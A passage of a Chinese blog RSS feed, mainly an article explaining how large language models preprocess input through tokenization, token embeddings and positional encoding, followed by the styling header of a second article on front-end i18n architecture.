</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LLM 原理 - 输入预处理]]></title>    <link>https://juejin.cn/post/7580210602079420450</link>    <guid>https://juejin.cn/post/7580210602079420450</guid>    <pubDate>2025-12-06T08:01:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580210602079420450" data-draft-id="7580278296837210146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LLM 原理 - 输入预处理"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2025-12-06T08:01:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="子洋"/> <meta itemprop="url" content="https://juejin.cn/user/1099167359835015"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LLM 原理 - 输入预处理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1099167359835015/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    子洋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T08:01:28.000Z" title="Sat Dec 06 2025 08:01:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>最近在学习大模型的实现原理，为了更好地理解整个流程，我把学习中的关键概念和实现细节整理成了笔记。一方面帮助自己梳理思路、加深印象，另一方面也作为日后复习和查阅的基础。内容会按照模型的实际处理流程展开，希望能以清晰易懂的方式记录大模型的核心机制。</p>
<h2 data-id="heading-1">大模型原理概述</h2>
<p>大模型最经典的架构图来自《Attention Is All You Need》，从这张图可以看到 Transformer 的基础结构是由“编码器”和“解码器”两部分组成的。虽然现在的大模型（像 GPT、LLaMA 这种）大多只保留了右侧的解码器结构，但它们整体的工作流程仍然遵循 Transformer 的思路。</p>
<p>整体原理可以简单理解成：</p>
<ol>
<li><strong>用户输入的文本会先经过 tokenizer 切成 token，再通过 embedding 转成向量。</strong></li>
<li><strong>这些向量会被送入 Transformer 的多层结构中处理。</strong><br/>
每一层都会做自注意力（Mulit-Head Attention，多头自注意力，让模型去关注上下文里的其他词）、前馈网络（Feed-Forward Network）、残差连接（Add）、层归一化（Norm）等操作，层数越多，模型对上下文的理解就越深。</li>
<li><strong>最后一层会把处理后的向量经过线性变换，然后通过 softmax 得到一个概率分布。</strong><br/>
这个概率分布表示：“在所有 token 里，下一步最可能是哪个”。</li>
<li><strong>模型会根据这个概率分布选出下一个 token（可能是选最高概率，也可能按概率采样）。</strong></li>
<li><strong>选出来的这个 token 会被加回当前输入，让模型继续推理下一个。</strong><br/>
模型就是这样不断循环：一步一步预测下一个 token，逐渐拼出完整的句子。</li>
<li><strong>当所有 token 都生成完成后，再通过 tokenizer 解码，就得到了最终的可读文本。</strong></li>
</ol>
<p>整体来说，大模型的生成过程并不是一次性输出整段文本，而是<strong>每次只预测一个 token，然后把它接回去继续算，直到生成结束</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f53183e5cb9b413791e332c96d33c0e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5rSL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612888&amp;x-signature=LCx5mskesqL7OgBMIddqcjI1Rx8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">输入预处理</h2>
<p>输入预处理虽然在 Transformer 的架构图中只占了一小块，但如果把整个生成流程拆开来看，它其实是整个大模型的第一步，也是后面所有计算的基础。输入处理得好不好，直接影响到模型能不能正确理解你的话。</p>
<h3 data-id="heading-3">1. <strong>训练阶段先要把词表准备好</strong></h3>
<p>在模型训练之前，会先收集海量的文本数据，然后训练一个 tokenizer。它的作用就是：</p>
<ul>
<li>把人类的自然语言拆成模型可接受的最小单位（叫 token）</li>
<li>给每个 token 分配一个唯一的 token id</li>
<li>形成一个固定的词表（vocab）</li>
</ul>
<p>token 不一定是字，也不一定是词，更不是固定长度。现代 tokenizer 通常是“子词模式”，比如：</p>
<pre><code class="hljs">我 | 今天 | 吃 | 了 | 橙 | 子
happy → hap | py
unbelievable → un | believe | able
</code></pre>
<p>也就是说，词表中既可能有完整的词，也可能是词的一部分，这样可以极大减少词表大小，让模型处理能力更灵活。</p>
<h3 data-id="heading-4">2. <strong>用户输入时，先把句子拆成 token</strong></h3>
<p>当用户输入一句话，比如：</p>
<pre><code class="hljs">我今天想吃火锅
</code></pre>
<p>模型不会直接拿这个句子处理，而是：</p>
<ul>
<li>按照训练好的 tokenizer 规则进行切分</li>
<li>得到对应的 token 序列</li>
<li>再查词表，把它们转成 token id</li>
</ul>
<p>得到的结果类似这样的一个数组：</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">123, 520, 11, 98, 8801</span>]
</code></pre>
<p>也就是数字形式的 token 序列。</p>
<h3 data-id="heading-5">3. <strong>token id 需要转成向量（Embedding）</strong></h3>
<p>模型不能直接理解 token id，因为 token id 只是一个“编号”，不包含任何语义。所以下一步是通过 embedding table，把 token id 转换成对应的向量：</p>
<ul>
<li>每个 token 变成一个高维向量（例如 4096 维）</li>
<li>所有 token 向量堆在一起就形成输入矩阵</li>
</ul>
<p>向量的意义是：</p>
<blockquote>
<p>让模型通过数字之间的关系来“理解”语言，比如相似的词向量更接近。</p>
</blockquote>
<h3 data-id="heading-6">4. 生成位置 embedding 告诉模型位置顺序</h3>
<p>Transformer 最大的特点是：</p>
<blockquote>
<p>它的注意力机制没有顺序意识。</p>
</blockquote>
<p>换句话说，如果没有额外的位置信息，它只知道有哪些 token，不知道谁在前、谁在后。</p>
<p>这会导致严重的问题，比如：</p>
<ul>
<li>“我吃了橙子”</li>
<li>“橙子吃了我”</li>
</ul>
<p>对模型来说，单看 token 本身完全一样，只是顺序不同，所以必须把位置告诉模型。</p>
<p>因此，模型会为每个 token 生成一个位置 embedding。</p>
<p>早期 Transformer 位置 embedding是正弦余弦序列，现代模型常用更先进的 RoPE（旋转位置编码）。但无论哪种方法，目的都是：</p>
<blockquote>
<p>告诉模型“你现在看到的是第 1 个、第 2 个、第 3 个 token…”</p>
</blockquote>
<h3 data-id="heading-7">5. <strong>token embedding 和 position embedding 合并</strong></h3>
<p>模型最终接收的是：</p>
<pre><code class="hljs language-arduino" lang="arduino">token 本身表达的含义（token embedding）
+ 
它在句子中的顺序（position embedding）
</code></pre>
<p>早期 Transformer 是直接做向量加法：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">final_embedding</span> = token_embedding + position_embedding
</code></pre>
<p>现代模型虽然底层机制更复杂（比如 RoPE 会作用到注意力的 Q、K 上），但整体来说：<strong>它们都是在让模型同时知道“词的语义”和“词的位置”。</strong></p>
<p>这两个 embedding 合并之后，就是最终送入 Transformer Block 的输入。</p>
<h3 data-id="heading-8">6. <strong>最终得到完整的输入矩阵</strong></h3>
<p>假设一句话拆成 10 个 token，每个 embedding 是 4096 维，那么模型的实际输入会是一个：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-number">10</span> <span class="hljs-string">×</span> <span class="hljs-number">4096</span> <span class="hljs-string">的矩阵</span>
</code></pre>
<p>这就是 Transformer 后面所有自注意力、多头机制和深层计算的起点。</p>
<h2 data-id="heading-9">总结一下</h2>
<p>输入预处理的整个流程可以总结为：</p>
<blockquote>
<p><strong>把文本 → token → token id → token embedding → 加上位置 embedding → 得到最终的输入向量矩阵，送进 Transformer。</strong></p>
</blockquote>
<p>它解决了三件关键问题：</p>
<ol>
<li>文本如何变成模型能算的数字</li>
<li>模型如何知道每个 token 的意思</li>
<li>模型如何知道 token 的顺序</li>
</ol>
<p>当这三步都准备好了，Transformer 才真正进入“理解和生成”的阶段。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🌏 父子组件 i18n（国际化）架构设计方案]]></title>    <link>https://juejin.cn/post/7579846221167673398</link>    <guid>https://juejin.cn/post/7579846221167673398</guid>    <pubDate>2025-12-05T01:32:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579846221167673398" data-draft-id="7579843977848193078" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🌏 父子组件 i18n（国际化）架构设计方案"/> <meta itemprop="keywords" content="架构,前端,前端工程化"/> <meta itemprop="datePublished" content="2025-12-05T01:32:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🌏 父子组件 i18n（国际化）架构设计方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T01:32:26.000Z" title="Fri Dec 05 2025 01:32:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAQlBMVEVHcEwlRnqtZBj76q4lRnolRnolRnolRnolRnokRnr/gGtrVUeLXDBKTl+hYSHasW7Ik0zs0JG4dCvUdEE0SW+rYxrLQJfjAAAACnRSTlMA////0H/xUaMi5MCoTwAACfVJREFUeNrtnQl3qygUgJ9GXAqosfL//+pgmgXwXmRNJGdu55xO+6rx8+6I8O9fehmGriN93zdN07bVXdpW/ih/SbpuGP6dXbpOXv7z2i3S9ISck2eQOnAhMHG64VQQbmrAaM4B05GmipaGdB+m6BNQPBXzMYtKR3EPbB/RS5eY4g+lIW9WBqnySCvVMrzRpqqs0g9nwVg5p1KYlHEchRT5bftp+y3n6xlQDjAkABtrKULU9f377ev+4/1/NiT+URRiZRhrcZP6WLa/Gq005BORaqXsdYEuHPIP798ZxSyt6d5sVfxJESRCsvB32lfXwhRjnUBGmKXNoJQe04VIASJqRC/9G7yDsyQMiloYz+0pHYghEoPISAGgpDSvHsCoMwmA0mfjSG5UOsqah2RodkljzMkhZZdamiEDB8+Nsbk9T04yGNljDXGOZZ6u0+Tj9DuvbyNJBuPO0ABtLNPlJtfZJ4CNNCWJoY8gddwxNpm9YrHh9DEkBoeMud4Kma8XRZaYpBJOYvg59U9wOsblMvmGrzQe30dyqFZ1dxPfO0FT5BOdw989THVs4q1TFk+iN4PMu7CaLpd4EJOExNaJLE4d0xQKYpJ0cY5Ozcwwu6WOu2cs9TUYxPB4b4fvLRzTUXbT1HH7y0BnB0j6CAehkPFfFzd1TMsi6sU1/P4VM9NiISHBlYnBMR+kad075sXlmMehj1twnfTUqJH4GJfqIKte7S72emPnHbdiYHIB0e6ATjKq1UoTaFh6wBL2csMIVo9fH/v6QRHAgoxrOHQQxG/36tC1ODmGOeBGBRmXalgcdhDQ1xF1vI6a3DF2d4r7G1enOUgNOshlFq7qUCxrca9ldiCam7ilxRbP6JbOYsYtfLFmkcXEgLG1DN/6eroxHjqh5bh+Uw27e1oWVK7pN+AqwzUcq/UYTPw8nWufLFBHN2zcxLRYlmGPs6rA2Wy0uJe/E7TknbHIa1WH1bLA8DAj3JpxET+FCNCWZ5uNT6jxTPZK/1mXoCBeKlGLRT2lP69XN3XdqqCojKX1ZVda6iD2McjeXSHa0I+AHd2InGAJgjRVM6gOBfygDrarRJnho6eQBbrns+HkcNUCWtYClJa66qFgPbqqZEBTCOAgRqxCOhQBWpZeIC6QBq91hEoI5unTjsMsK9DCFigY9WNn19hgVCrELalrTw6WnYMYzjHhQ2/7G2xTx1HvwpzSe4cVi5ORQQwMW9+72FU5L4gGsa6Yu1RcDeIhs64Qs8izt0vGH+n9/IKaIlYpM2UqkYOrwwq5CgBjWpyGtxaonxe4KaJ3hx+7O0HaqVkxLBPj8FmBVmjNevIUFhUuDmMq5NDV9RwyPe/95IvxAhG7ymqxHGE5sZJL2kPLUhUinkXfrnFwGFwXD99djNLSFh/meXEb2B6Oyiwm0I7BC+OlTlOVPk9K8CIYzu5YHwKDTI6XAo5lz3WEqEXwQRKhh5cyLa6D81P4PXBw984as9YaGXHwx4Ba8rmOldUat/BHt9cQ38AaljnBdCJqs60OcXVDJZP//ZwSWtV9FpHNtgg22KuYx/U2tB5Mcp1TYOiphNhiFjgWeJ3DL2OZpuuUisIoUyzZEJ76I+LmyqWdv8LwnEiwMYczihjxeqtBsuFJSTg2oD1ETQx4v6D1VleSZW1xCwvAfVGWpQ069kgrQksAUW2rReYzsboIjSABuDQX0QJwB9cnZVgWVgE31vrklAJnEmVObykgYCk/VGX5OlpuKb5eiovUAvJ2tMstw0kIkNdpiSA91K6XA6K8CVCyr4PePhTo65q3DyX7OpTbSVk1PB62mhJ9HSpSqtKaESxsFRm0tLBVcvTV+vbBrLRK4hC7aitN9B0ZpX6vNMgjGIt5ZdmMv32KrmprD1afsPd4FEhThK0+WfTl3kpd482AGvG3jQdZK1+t8ireDswhofigRb3fxfI/4jj+xkffUX/1ccxxhEP9qyyBEH9Cx9vhf8TB7eiSpBHjZVSa4whQMJC1TqIR6q8RERtjOr2ID0yx3oYi0oAIvZCPz4eG64p3ObuREeOHUIR3MBVJwq9yll5P7KHdiPBOiOoRa